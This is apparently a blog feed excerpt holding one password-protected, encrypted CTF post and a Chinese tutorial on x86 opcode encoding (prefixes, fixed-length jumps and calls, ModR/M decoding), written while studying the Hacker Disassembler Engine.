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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>理解反汇编引擎hacker_disassembler_engine(HDE)</title>
    <url>/2019/03/16/%E7%90%86%E8%A7%A3%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8Ehacker_disassembler_engine(HDE)/</url>
    <content><![CDATA[<p>我需要使用一个mini的反汇编引擎嵌入我的C项目中，能够做简单的指令分析工作，帮我区分操作码和数据。发现国外大佬写的Hacker_disassembler_engine很满足我的需求，但是奈何我看不懂啊，不得不学习一下intel的opcode，于是有了下文。</p>
<a id="more"></a>
<h2 id="intel机器码"><a href="#intel机器码" class="headerlink" title="intel机器码"></a>intel机器码</h2><p>intel的指令体系为复杂指令系统（CISC），它这里的复杂绝非浪得虚名，由于以往的机器上内存是个很昂贵的设备，因此，intel的指令编码尽可能地利用了每一个bit，再加上兼容性的考虑，使得整个intel指令结构异常复杂。 </p>
<p>物理上，CPU的逻辑运算单元只操作计算机中的两个对象：寄存器和内存。除了这两个操作对象之外，还有一种对象，那就是立即数（immediate），物理上指令执行时，这个数字是在CPU中的，也就是CPU取得的指令中，这个数就已经在那里了。所有的指令编码都是围绕着这三个操作对象进行的，不同的是立即数不需要去找，寄存器简单的编码就行了，而内存不但需要指出其位置，还要指出其大小。此外，还有一些辅助的操作说明，比如是否重复一些操作等等。</p>
<h3 id="intel指令格式"><a href="#intel指令格式" class="headerlink" title="intel指令格式"></a>intel指令格式</h3><p>看一下intel的确切的指令格式：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/19559.jpg" alt="http://pic.wonderkun.cc/uploads/2019/03/19559.jpg"><br> prefix部分是指令操作的一些辅助说明，opcode编码了进行什么样的操作，跟汇编格式里面的mnemonic对应，CPU知道了什么操作之后就会寻找操作的对象，是寄存器还是内存？ModR/M部分就给出了操作的对象，R是register，M是memory，而Mod指示了到底是寄存器还是内存。如果ModR/M的字节数足够大的话，那么或许就不需要后面的两个部分了，实际上ModR/M只有一个字节，能编码所有的寄存器，却不能编码所有的内存寻址模式，intel使用后面两个部分来辅助ModR/M完成确切的内存定位SIB和displacement。寻址方式跟CPU对内存的管理密切相关，intel的寻址方式很多，但全部都编码到了SIB和displacement之中。但是需要注意一个OpCode不只对应一个mnemonic，一个mnemonic不只对应一个OpCode。 </p>
<h3 id="定长指令"><a href="#定长指令" class="headerlink" title="定长指令"></a>定长指令</h3><p>定长指令（指的是一个Opcode对应的指令长度是一定的），其对应的汇编指令格式是固定的（比如0X40不能加立即数和偏移量就只能表示inc eax；而B0只能加一个字节的立即数指令长度为2字节，B0 XX即为mov al,XX不能能表示其他任何指令），但不管是定长还是不定长的硬编码，其都可以从下面的Opcode Map表（TableA-2和TableA-3）中找查出来（红色圈出来的是比较重要的以及我们要分析的定长指令）：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170823171705782.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170823171705782.png"></p>
<p>一个1Byte的定长指令，其16进制为类似于“AB”的形式，而第一个A是Opcode Map表中的行号，第二个的B是其列号，行号和列号就能确定一个具体的指令。比如：第4行第5列索引出来的指令为（绿色圈出来）：<code>inc ebp</code>，第5行第0列为<code>push eax</code>等等。</p>
<p>但是由于指令的Opcode部分不止有一个字节的，还有两个字节的，那么两个字节的仅仅用该表是无法表示的，设计人员在设计时，留了一个特殊的位置即<code>0F</code>，<code>0F</code>作为两字节指令的第一字节，而第二字节再另外一张表中。也就是说所有两字节的指令都是以0F开头的（注意：这里说的两字节都是仅仅指Opcode的长度）。而另外一张表（TableA-4与TableA-5）如下所示：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170823173339390.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170823173339390.png"></p>
<p>来看几个一字节的指令，看一下规律：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">50</span>	&lt;–&gt; <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line"><span class="number">51</span>	&lt;–&gt; <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line"><span class="number">52</span>	&lt;–&gt; <span class="keyword">push</span> <span class="built_in">edx</span></span><br><span class="line"><span class="number">53</span>	&lt;–&gt; <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line"><span class="number">54</span>	&lt;–&gt; <span class="keyword">push</span> <span class="built_in">esp</span></span><br><span class="line"><span class="number">55</span>	&lt;–&gt; <span class="keyword">push</span> <span class="built_in">ebp</span></span><br><span class="line"><span class="number">56</span>	&lt;–&gt; <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line"><span class="number">57</span>	&lt;–&gt; <span class="keyword">push</span> <span class="built_in">edi</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">eax</span> &lt;==&gt; <span class="keyword">nop</span></span><br><span class="line"><span class="number">91</span>	&lt;–&gt; <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line"><span class="number">92</span>	&lt;–&gt; <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"><span class="number">93</span>	&lt;–&gt; <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ebx</span></span><br><span class="line"><span class="number">94</span>	&lt;–&gt; <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">esp</span></span><br><span class="line"><span class="number">95</span>	&lt;–&gt; <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span></span><br><span class="line"><span class="number">96</span>	&lt;–&gt; <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">97</span>	&lt;–&gt; <span class="keyword">xchg</span> <span class="built_in">eax</span>,<span class="built_in">edi</span></span><br></pre></td></tr></table></figure>

<p>这里可以发现一个规律，都是寄存器跟编号之间有一定的对应关系，比如0对对应eax,寄存器编号如下所示。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170823180331161.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170823180331161.png"></p>
<h4 id="修改EIP并且与JCC对应的定长指令"><a href="#修改EIP并且与JCC对应的定长指令" class="headerlink" title="修改EIP并且与JCC对应的定长指令"></a>修改EIP并且与JCC对应的定长指令</h4><p>硬编码中的Opcode后面的立即数并非是跳转的地址，<code>跳转地址=当前指令地址+当前指令长度+imm</code></p>
<h5 id="近距离JCC跳转"><a href="#近距离JCC跳转" class="headerlink" title="近距离JCC跳转"></a>近距离JCC跳转</h5><p>条件跳转：Opcode后面跟一个立即数的偏移，因此指令共两个字节(跳转地址只占有一个字节)<br>立即数是有符号的：最高位为0(7F)向下跳，最高位为1(80)向上跳</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">70</span>	&lt;–&gt; <span class="keyword">JO</span>(O标志位为<span class="number">1</span>跳转)</span><br><span class="line"><span class="number">71</span>	&lt;–&gt; <span class="keyword">JNO</span></span><br><span class="line"><span class="number">72</span>	&lt;–&gt; <span class="keyword">JB</span>/<span class="keyword">JNAE</span>/<span class="keyword">JC</span></span><br><span class="line"><span class="number">73</span>	&lt;–&gt; <span class="keyword">JNB</span>/<span class="keyword">JAE</span>/<span class="keyword">JNC</span></span><br><span class="line"><span class="number">74</span>	&lt;–&gt; <span class="keyword">JZ</span>/<span class="keyword">JE</span></span><br><span class="line"><span class="number">75</span>	&lt;–&gt; <span class="keyword">JNZ</span>/<span class="keyword">JNE</span></span><br><span class="line"><span class="number">76</span>	&lt;–&gt; <span class="keyword">JBE</span>/<span class="keyword">JNA</span></span><br><span class="line"><span class="number">77</span>	&lt;–&gt; <span class="keyword">JNBE</span>/<span class="keyword">JA</span></span><br><span class="line"><span class="number">78</span>	&lt;–&gt; <span class="keyword">JS</span></span><br><span class="line"><span class="number">79</span>	&lt;–&gt; <span class="keyword">JNS</span></span><br><span class="line">7A	&lt;–&gt; <span class="keyword">JP</span>/<span class="keyword">JPE</span></span><br><span class="line">7B	&lt;–&gt; <span class="keyword">JNP</span>/<span class="keyword">JPO</span></span><br><span class="line">7C	&lt;–&gt; <span class="keyword">JL</span>/<span class="keyword">JNGE</span></span><br><span class="line"><span class="number">7D</span>	&lt;–&gt; <span class="keyword">JNL</span>/<span class="keyword">JGE</span></span><br><span class="line">7E	&lt;–&gt; <span class="keyword">JLE</span>/<span class="keyword">JNG</span></span><br><span class="line">7F	&lt;–&gt; <span class="keyword">JNLE</span>/<span class="keyword">JG</span></span><br></pre></td></tr></table></figure>

<h5 id="0F80-0F8F远距离JCC跳转"><a href="#0F80-0F8F远距离JCC跳转" class="headerlink" title="0F80~0F8F远距离JCC跳转"></a>0F80~0F8F远距离JCC跳转</h5><p>后面跟一个四字节的立即数，指令长共6字节<code>80000000~7fffffff</code>。</p>
<h4 id="其他修改EIP的指令"><a href="#其他修改EIP的指令" class="headerlink" title="其他修改EIP的指令"></a>其他修改EIP的指令</h4><p>同JCC指令的硬编码一样，其硬编码中Opcode后面的立即数也不是要跳转的地址，计算方式同JCC相同：<code>跳转地址=当前指令地址+当前指令长度+imm</code>。</p>
<h5 id="与ECX相关的跳转指令（循环指令）"><a href="#与ECX相关的跳转指令（循环指令）" class="headerlink" title="与ECX相关的跳转指令（循环指令）"></a>与ECX相关的跳转指令（循环指令）</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">E0	&lt;–&gt; loopne/<span class="function">loopnz <span class="title">Ib</span><span class="params">(dec ecx)</span>	<span class="params">(ZF=<span class="number">0</span> &amp;&amp; ECX != <span class="number">0</span>)</span></span></span><br><span class="line">E1	&lt;–&gt; loope/loopz Ib(dec ecx)	(ZF=1 &amp;&amp; ECX != 0)</span><br><span class="line">E2	&lt;–&gt; <span class="function">loop <span class="title">Ib</span><span class="params">(dec ecx)</span>	<span class="params">(满足ECX != <span class="number">0</span>就跳转)</span></span></span><br><span class="line">E3	&lt;–&gt; jecxz/jrcxz Ib	(满足ECX=0跳转)</span><br><span class="line">注意： Ib即为<span class="keyword">byte</span>类型立即数（Immediate data），Iw则是Immediate data <span class="keyword">word</span>，Id即为Immediate data dword，Ap即六字节长度的直接地址</span><br></pre></td></tr></table></figure>

<p>测试如下：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170823182949234.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170823182949234.png"></p>
<h5 id="直接CALL与间接CALL"><a href="#直接CALL与间接CALL" class="headerlink" title="直接CALL与间接CALL"></a>直接CALL与间接CALL</h5><p>所谓直接call即编译时确定地址，间接call即地址存在内存中，并且在内存中的地址也是运行时才确定。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">E8	&lt;–&gt; <span class="keyword">call</span> Id</span><br><span class="line">E9	&lt;–&gt; <span class="keyword">jmp</span> Id</span><br><span class="line">EA	&lt;–&gt; <span class="keyword">jmp</span> Ap,<span class="keyword">jmp</span> <span class="built_in">CS</span>:Id	(**前四个字节为跳转地址，后两个字节为段选择子.**即高两字节赋给<span class="built_in">CS</span>，低四字节赋给<span class="built_in">EIP</span>)</span><br><span class="line">EB	&lt;–&gt; <span class="keyword">jmp</span> Ib</span><br><span class="line">FF	&lt;–&gt; <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span>]</span><br></pre></td></tr></table></figure>

<p>E8call为直接call，call后面的地址即为要跳转的地址，FFcall为间接call，后面跟的内存那只能够存放着即将要跳转的地址。比如用对象指针访问一个普通成员函数和一个虚函数，其call的硬编码都不同：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170823184446611-1.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170823184446611-1.png"></p>
<h5 id="ret和retf"><a href="#ret和retf" class="headerlink" title="ret和retf"></a>ret和retf</h5><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">C3	&lt;–&gt;<span class="keyword">ret</span>	(<span class="keyword">pop</span> <span class="built_in">eip</span>)</span><br><span class="line">C2	&lt;–&gt;<span class="keyword">ret</span> Iw	(<span class="keyword">pop</span> <span class="built_in">eip</span>后，栈顶<span class="built_in">esp</span> = <span class="built_in">esp</span> + Iw)</span><br><span class="line">CB	&lt;–&gt;<span class="keyword">retf</span>	(出栈<span class="number">8</span>字节，低四字节赋给<span class="built_in">EIP</span>，高四字节的低两字赋给<span class="built_in">CS</span>)</span><br><span class="line">CA	&lt;–&gt;<span class="keyword">retf</span> Iw	(在CB的基础上再做一步<span class="built_in">esp</span> = <span class="built_in">esp</span> + Iw)</span><br></pre></td></tr></table></figure>

<h4 id="指令前缀"><a href="#指令前缀" class="headerlink" title="指令前缀"></a>指令前缀</h4><p>我们在上面提过，修改寄存器的指令中不存在16位寄存器修改的硬编码。而这些与16位寄存器相关的编码是通过加上<code>指令前缀（Instruction Prefixes）</code>的方式来实现的，有指令前缀则原本的32位寄存器操作指令，就会变为16位寄存器操作指令来用，不仅是定长指令如此，不定长指令也是如此。但指令前缀不仅能进行16位32位寄存器操作硬编码转换，我们一一来看几种常用的指令前缀：</p>
<h5 id="段前缀"><a href="#段前缀" class="headerlink" title="段前缀"></a>段前缀</h5><p>首先在32位汇编中，8个段寄存器：ES、CS、SS、DS、FS、GS、LDTR、TR(顺序固定)，不再用段寄存器寻址而只做权限控制。段寄存器其实是个结构体，共96位，用汇编指令只能访问其中16位。</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">2E</span> - CS</span><br><span class="line"><span class="symbol">36 </span>- SS</span><br><span class="line"><span class="number">3E</span> - DS</span><br><span class="line"><span class="symbol">26 </span>- ES</span><br><span class="line"><span class="symbol">64 </span>- FS</span><br><span class="line"><span class="symbol">65 </span>- GS</span><br></pre></td></tr></table></figure>

<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170823190239236.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170823190239236.png"></p>
<p>其中8925是Opcode，而不同的指令前缀代表了不同的段寄存器。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">注意:如果没有特殊说明即没有人为指定段前缀，且中括号里面有寄存器的时候有如下约定:</span><br><span class="line"><span class="number">1</span>.[]里不存在<span class="built_in">ebp</span>/<span class="built_in">esp</span>/<span class="built_in">edi</span>则默认为<span class="built_in">DS</span>:[]</span><br><span class="line"><span class="number">2</span>.[]里存在<span class="built_in">ebp</span>/<span class="built_in">esp</span>则默认为<span class="built_in">SS</span>:[]</span><br><span class="line"><span class="number">3</span>.[]里存在<span class="built_in">edi</span>默认是<span class="built_in">ES</span>:[],<span class="built_in">esi</span>默认是<span class="built_in">DS</span>:[]</span><br></pre></td></tr></table></figure>

<h5 id="操作指令前缀：修改默认长度"><a href="#操作指令前缀：修改默认长度" class="headerlink" title="操作指令前缀：修改默认长度"></a>操作指令前缀：修改默认长度</h5><p>这个即所谓指令前缀解决无16位寄存器操作指令的问题：<code>0X66</code>前缀修饰Opcode，则修正32位长度为16位：<br>如下所示（无论定长指令50还是不定长指令89均相同）：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170823190715685.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170823190715685.png"></p>
<h5 id="操作指令前缀-修改默认寻址方式"><a href="#操作指令前缀-修改默认寻址方式" class="headerlink" title="操作指令前缀:修改默认寻址方式"></a>操作指令前缀:修改默认寻址方式</h5><p><strong>0X67</strong>作为前缀修改操作数宽度(将硬编码默认对应的操作数宽度改为16位)<br>如下所示（操作指令前缀将寻址方式按16位汇编的寻址方式进行寻址）：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/20170823190949527.png" alt="http://pic.wonderkun.cc/uploads/2019/03/20170823190949527.png"></p>
<p>同一Opcode因为有无指令前缀而长度不同，因此加上指令前缀前后相当于Opcode的指令长度也是不定的，但是这些“不定长”可预见的。有前缀则指令长度加一。而真正的不定长指令却不是如此的。</p>
<h3 id="不定长指令"><a href="#不定长指令" class="headerlink" title="不定长指令"></a>不定长指令</h3><h4 id="ModR-M"><a href="#ModR-M" class="headerlink" title="ModR/M"></a>ModR/M</h4><p>首先来看几条指令的通用公式</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">88 </span> &lt;–&gt;mov Eb,Gb	</span><br><span class="line"><span class="number">89</span>	&lt;–&gt;mov Ev,Gv</span><br><span class="line"><span class="number">8</span>A  &lt;–&gt;mov Gb,Eb</span><br><span class="line"><span class="number">8</span>B	&lt;–&gt;mov Gv,Ev</span><br></pre></td></tr></table></figure>

<p>这些指令都是可以从opcode map中查到的。</p>
<p>对几个关键词做如下解释：</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">G:</span>通用寄存器</span><br><span class="line"><span class="string">E:</span>寄存器/内存</span><br><span class="line"><span class="string">b:</span>字节</span><br><span class="line"><span class="string">v:</span>word\<span class="keyword">double</span> word\quadword(<span class="number">16</span><span class="regexp">/32/</span><span class="number">64</span>位,取决于CPU模式)</span><br></pre></td></tr></table></figure>

<h5 id="指令长度常规情况分析"><a href="#指令长度常规情况分析" class="headerlink" title="指令长度常规情况分析"></a>指令长度常规情况分析</h5><p>如果确定是不定长指令，则其后必定存在一个字节的ModR/M，而ModR/M的bit信息指出了通用形式的不定长指令的具体形式，ModR/M的格式如下所示：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="code">+------+</span>-------<span class="code">+--------+</span></span><br><span class="line">| 7,6  |5,4,3  |  2,1,0 |</span><br><span class="line"><span class="code">+------+</span>-------<span class="code">+--------+</span></span><br><span class="line"><span class="code">  Mod  Reg/Opcode  R/M</span></span><br></pre></td></tr></table></figure>

<p><strong>其中第3、4、5位三位即Reg/Opcode来确定是哪一个通用寄存器G</strong>，（<strong>暂时仅考虑Reg/Opcode中reg的情况</strong>）；<br><strong>其它两部分来确定E是什么（R/M）以及具体细节。</strong></p>
<p>（Mod值有0-3四种情况、Reg/Opcode和R/M有0-7八种情况；Mod的00~10是内存，11是寄存器；R/M与Reg/Opcode的值即为寄存器的编号：eax/ax/al编号0、ecx/cx/cl编号为1…）</p>
<p>我们拿一条指令来具体分析：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">测试一：<span class="string">"88 01 02 03 04 05 06 …"</span></span><br><span class="line">分析：</span><br><span class="line"><span class="number">1.</span> <span class="string">"88"</span>我们知道其同通式是“mov Eb,Gb”，因此<span class="number">88</span>是不定长指令，所以其后的一个字节<span class="string">"01"</span>即为ModR/M；</span><br><span class="line"><span class="number">2.</span> 我们将“<span class="number">01</span>”按照ModR/M的格式拆分成三部分：</span><br><span class="line"><span class="number">01</span>== <span class="number">0000</span> <span class="number">0001</span> ==&gt; <span class="number">00</span> <span class="number">000</span> <span class="number">001</span>三部分 ==&gt; Mod=<span class="number">00</span>=<span class="number">0</span>，Eb即为byte ptr的内存；Reg/Opcode=<span class="number">000</span>=<span class="number">0</span>，即为eax/ax/al寄存器（Eb即byte则为al）；R/M=<span class="number">001</span>=<span class="number">1</span>，即为ecx</span><br><span class="line"><span class="number">3.</span> 确定出“<span class="number">8801</span>”的汇编指令为：mov byte ptr [ecx],al ==&gt;mov byte ptr ds:[ecx],al（没有指令前缀则DS是默认的）</span><br><span class="line"><span class="number">4.</span> 而“<span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span>…”就是下一条指令的编码了。</span><br></pre></td></tr></table></figure>

